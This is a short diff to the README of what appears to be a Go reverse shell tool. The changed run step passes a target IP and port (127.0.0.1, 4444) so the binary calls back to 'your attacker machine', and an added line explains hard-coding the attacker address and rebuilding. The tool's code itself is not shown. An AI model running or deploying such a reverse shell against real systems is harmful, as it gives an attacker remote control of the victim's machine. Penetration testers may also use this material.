@@ -32,8 +32,10 @@ This builds an exe of the same name.
 ### Step 2: Run
 From command prompt/powershell/terminal execute the following binary to call back to your attacker machine
 ``` CMD
-.\go-reverseshell.exe
+.\go-reverseshell.exe -targetIP="127.0.0.1" -targetPort=4444
 ```
+
+if you want to execute the reverse shell without parameters, hard code the attackerIP and port and rebuild: go build go-reverseshell.go
 
 ### Development
 
